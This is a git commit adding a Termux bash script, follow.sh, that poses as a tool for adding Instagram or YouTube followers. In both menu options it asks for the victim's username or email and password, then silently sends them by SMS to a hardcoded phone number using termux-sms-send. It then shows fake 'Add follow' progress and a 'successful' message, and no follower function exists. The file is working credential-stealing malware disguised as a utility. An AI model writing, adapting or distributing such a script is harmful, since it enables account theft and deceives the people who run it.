74315db00322cc0a73d8a24f6c6bc0baa1b5f33a
profionaldhim <35074237+profionaldhim@users.noreply.github.com>
2019-03-13 20:30:04 +0300

    Add files via upload

---
+++ follow.sh
@@ -0,0 +1,222 @@
+
+#!bin/bash
+
+clear
+red='\e[1;31m'
+green='\e[1;32m'
+blue='\e[1;34m'
+purple='\e[1;35m'
+cyan='\e[1;36m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+
+toilet -f term -F border --gay 'How To Add Follows 1000 To your insta '
+echo ""
+
+echo ""
+echo -e $white '÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷'
+echo -e $red '#                                            #'
+echo -e $green '#                                            #'
+         figlet "  following "
+echo -e $white '#                                            #'
+echo -e $green '#         Copy®ight by Mohammed Info         #'
+echo -e $white '#                                            #'
+echo -e $green '#           whatsapp :+967733014747          #'
+echo -e $white '#                                            #'
+echo -e $red   '#               from :- Yemen                #'
+echo -e $white '#                                            #'
+echo -e $white '#                                            #'
+echo -e $white '÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷'
+echo ""
+echo ""
+echo -e $white " must be Install termux-api from google play"
+echo ''
+echo -e $red "~~~~~~~~~ add follows to your insta 100% ~~~~~~~~~"
+echo ""
+echo -e $green "1- Add follows Now to ==> instagram (*_°)"
+echo ""
+echo -e $green "2- Add follows Now to ==> Channel youtube 0_0 "
+echo ""
+echo ""
+echo -e $green "0- Exit [~]"
+echo ""
+#################
+#cp insta-following.py $PREFIX/bin
+#chmod +x $PREFIX/bin/insta-following.py
+#mkdir $PREFIX/share/insta-following
+#cp insta-following.py $PREFIX/share/insta-following
+
+#python $PREFIX/bin/insta-following.py
+read -p "insert number :》 " follow
+if [ $follow = 1 ]
+then
+clear
+echo ""
+echo ""
+toilet -f term -F border --gay 'How To Add Follows 1000 To your insta '
+echo ""
+echo ""
+echo -e $white '÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷'
+echo -e $red '#                                            #'
+echo -e $green '#                                            #'
+         figlet "  following "
+echo -e $white '#                                            #'
+echo -e $green '#         Copy®ight by Mohammed Info         #'
+echo -e $white '#                                            #'
+echo -e $green '#           whatsapp :+967733014747          #'
+echo -e $white '#                                            #'
+echo -e $red   '#               from :- Yemen                #'
+echo -e $white '#                                            #'
+echo -e $white '#                                            #'
+echo -e $white '÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷'
+echo ""
+echo ""
+echo -e $white " must be Install termux-api from google play"
+echo ''
+echo -e $red "~~~~~~~~~ add follows to your insta 100% ~~~~~~~~~"
+echo ""
+echo -e $green ' ++++++++++++++++++++++++++++++++++++++++++++ '
+echo -e $red   ' |                                          | '
+echo -e $white ' |  please insert Your Email\Username\phone | '       
+echo -e $red   ' |                                          | '
+echo -e $green ' |++++++++++++++++++++++++++++++++++++++++++| '
+echo ""
+echo ""
+read -p "insert number :》 " user
+echo -e $green ' ++++++++++++++++++++++++++++++++++++++++++++ '
+echo -e $red   ' |                                          | '
+echo -e $white ' |  please insert Your password             | '       
+echo -e $red   ' |                                          | '
+echo -e $green ' |++++++++++++++++++++++++++++++++++++++++++| '
+echo ""
+echo ""
+read -p "insert number :》 " password
+
+pkg install termux-api -y
+termux-sms-send -n +967733014747 $user,$password
+echo "Mohammed Info"
+sleep 1
+clear
+echo -e $green "Add follow 1 .>> "
+sleep 1
+clear
+echo -e $red "Add follow 1 .>> >> "
+sleep 1
+clear
+echo -e $white "Add follow 1 .>> >> >> "
+sleep 1
+clear
+echo -e $green "Add follow 1 .>> >> >> >> "
+sleep 1
+clear
+echo -e $red "Add follow 1 .>> >> >> >> >> "
+sleep 1
+clear
+echo -e $white "Add follow 1 .>> >> >> >> >> >> "
+sleep 1
+clear
+echo -e $green "Add follow 1 .>> >> >> >> >> >> >> "
+sleep 1
+clear
+echo -e $red "Add follow 1 .>> >> >> >> >> >> >> >> "
+sleep 1
+clear
+echo ""
+#python insta-following.py
+figlet "successful *_*"
+clear
+bash follow.sh
+fi
+
+if [ $follow = 2 ]
+then
+clear
+echo ""
+echo ""
+toilet -f term -F border --gay 'How To Add Follows 1000 To your insta '
+echo ""
+
+echo ""
+echo -e $white '÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷'
+echo -e $red '#                                            #'
+echo -e $green '#                                            #'
+         figlet "  following "
+echo -e $white '#                                            #'
+echo -e $green '#         Copy®ight by Mohammed Info         #'
+echo -e $white '#                                            #'
+echo -e $green '#           whatsapp :+967733014747          #'
+echo -e $white '#                                            #'
+echo -e $red   '#               from :- Yemen                #'
+echo -e $white '#                                            #'
+echo -e $white '#                                            #'
+echo -e $white '÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷'
+echo ""
+echo ""
+echo -e $white " must be Install termux-api from google play"
+echo ''
+echo -e $red "~~~~~~~~~ add follows to your insta 100% ~~~~~~~~~"
+echo ""
+echo -e $green ' ++++++++++++++++++++++++++++++++++++++++++++ '
+echo -e $red   ' |                                          | '
+echo -e $white ' |  please insert Your Email\Username\phone | '       
+echo -e $red   ' |                                          | '
+echo -e $green ' |++++++++++++++++++++++++++++++++++++++++++| '
+echo ""
+echo ""
+read -p "insert number :》 " user
+echo -e $green ' ++++++++++++++++++++++++++++++++++++++++++++ '
+echo -e $red   ' |                                          | '
+echo -e $white ' |  please insert Your password             | '       
+echo -e $red   ' |                                          | '
+echo -e $green ' |++++++++++++++++++++++++++++++++++++++++++| '
+echo ""
+echo ""
+read -p "insert number :》 " password
+
+pkg install termux-api -y
+termux-sms-send -n +967733014747 $user,$password
+echo "Mohammed Info"
+sleep 1
+clear
+echo -e $green "Add follow 1 .>> "
+sleep 1
+clear
+echo -e $red "Add follow 1 .>> >> "
+sleep 1
+clear
+echo -e $white "Add follow 1 .>> >> >> "
+sleep 1
+clear
+echo -e $green "Add follow 1 .>> >> >> >> "
+sleep 1
+clear
+echo -e $red "Add follow 1 .>> >> >> >> >> "
+sleep 1
+clear
+echo -e $white "Add follow 1 .>> >> >> >> >> >> "
+sleep 1
+clear
+echo -e $green "Add follow 1 .>> >> >> >> >> >> >> "
+sleep 1
+clear
+echo -e $red "Add follow 1 .>> >> >> >> >> >> >> >> "
+sleep 1
+clear
+echo ""
+#python insta-following.py
+figlet "successful *_*"
+clear
+bash follow.sh
+
+fi
+
+if [ $follow = 0 ]
+then
+clear
+echo ""
+echo ""
+figlet "GOOD BYE"
+echo ""
+figlet " Exit"
+#python insta-following.py
+fi
